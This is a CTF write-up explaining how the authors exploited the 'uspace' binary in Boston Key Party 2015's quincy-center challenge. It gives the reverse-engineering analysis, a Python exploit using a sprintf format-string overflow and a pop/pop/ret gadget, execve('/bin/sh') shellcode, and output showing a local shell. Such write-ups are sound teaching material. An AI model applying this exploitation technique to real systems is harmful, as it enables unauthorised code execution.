---
title: '[bkpCTF-2015] quincy-center (uspace) write-up'
author: PPP
layout: post
categories:
  - CTF
  - Write-Ups
date: 2015-03-07 13:37:00
---
This is a write-up for **quincy-center** challenge, which is the first part of 3-chained pwnable challenge from <a href="https://ctftime.org/event/163" target="_blank">Boston Key Party CTF</a> last weekend. You can read about the other parts here: <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1229" target="_blank">quincy-adams</a>, <a href="http://ppp.cylab.cmu.edu/wordpress/?p=1234" target="_blank">braintree</a>. You can also read from the <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/" target="_blank">origial post</a>.


The binaries were packaged into a <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/zenhv-e941cb4585deafcf5a1b86050a3ebe7a.gz" target="_blank">tar ball</a>.

> The MBTA wrote a cool system. It&#8217;s pretty bad though, sometimes the commands work, sometimes they don&#8217;t&#8230;  
> Exploit it. (uspace flag) 54.165.91.92 8899

The goal is to get &#8220;uspace&#8221; flag by exploiting the user space process.

Looking at the output of <span class="lang:default decode:true  crayon-inline">file</span> , these are all x86_64 binaries.

{% highlight bash %}
$ file uspace 
uspace: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=98a138f60a8cfd6239de3181ef118776db40c8e6, stripped
{% endhighlight %}

Opening up in IDA Pro, we see that <span class="lang:default decode:true  crayon-inline">sub_401470</span> has the process loop that prompts &#8220;bksh> &#8221; like a shell environment.

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_1.png" lightbox="quincy-center" title="bksh (uspace) command line parser" %}

First, we see that there are semaphore locking/unlocking for I/O operations, which don&#8217;t seem to be too important at the moment. Then, the code to parse the command follows.

The general scheme for how the system works will be explained in the next series (kspace), so we will leave out the details of how things are implemented and maintained for now. Understanding the operations (create, list, remove, etc.) abstractly is good enough for exploiting the user space :)

There are total of 6 commands it understands: **ls**, **create**, **rm**, **cat**, **sleep**, and **exit**.

  * ls &#8211; lists files on the system
  * create &#8211; creates a new file on the system
  * rm &#8211; deletes a file on the system
  * sleep &#8211; sleep&#8230;
  * exit &#8211; exits the shell

Let&#8217;s look at what **create** does for us.

The function takes the first argument to the command as a file name, and reads 256 bytes from the user for the content of the file that is being created. The buffer that is being read is large enough, so there&#8217;s no overflow here. Then, it &#8220;calls&#8221; into the kernel &#8220;syscall&#8221; (via shared memory) with the syscall number 96 and its two arguments (file name & contents buffer). Everything seems normal and sane, so we move on.

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_2.png" lightbox="quincy-center" title="create syscall (from uspace to kspace)" %}

Looking through more functions, we find a vulnerable code in **cat**, where it uses <span class="lang:default decode:true  crayon-inline ">sprintf</span> with the file contents buffer as its format string (aka trivial buffer overflow).

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_3.png" lightbox="quincy-center" title="&#8220;cat&#8221; operation (open syscall followed by read syscall)" %}

**v12** is a stack buffer of size 256 bytes, and it&#8217;s located **bp-0x118**. Also, we noticed that the NX was disabled on this binary, so we could easily jump to our buffer (such as one of our arguments for the command). Conveniently, the pointers to our arguments are on the stack, so we can do a simple pop/pop/ret gadget to get an arbitrary code execution!

<p class="filename">pwn_uspace.py</p>
{% highlight python linenos %}
#!/usr/bin/python
import struct

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

f = open('payload', 'wb')

pop_pop_ret = 0x40110F

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + open('shell.bin').read()+ '\n').ljust(0x400, '#'))
{% endhighlight %}

&nbsp;

<p class="filename">shell.asm</p>
{% highlight asm linenos %}
[BITS 64]

section .text
global _start
_start:

lea rdi, [rel binsh]
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall

binsh:
db '/bin/sh',0
{% endhighlight %}

&nbsp;

<p class="filename">Pwn it!</p>
{% highlight bash %}
$ python pwn_uspace.py
$ (cat ../uspace/payload; cat -) | sudo ./tz
bksh> bksh>
whoami
uspace
{% endhighlight %}

We have successfully got a shell as *uspace* user.  
(Note that since the challenge servers are down, the exploitation is shown in a local setup.)

Once we have arbitrary code running on uspace, we can then perform syscalls that are exposed by the kernel, but not available through a user-space interface (such as syscall number 92, shown below).

{% include figure.html src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_4.png" lightbox="quincy-center" title="kspace syscall handler" %}

The analysis of kspace & tz will be continued on the next post.

&nbsp;

Write-up by Cai (Brian Pak) [[https://www.bpak.org](http://www.bpak.org)]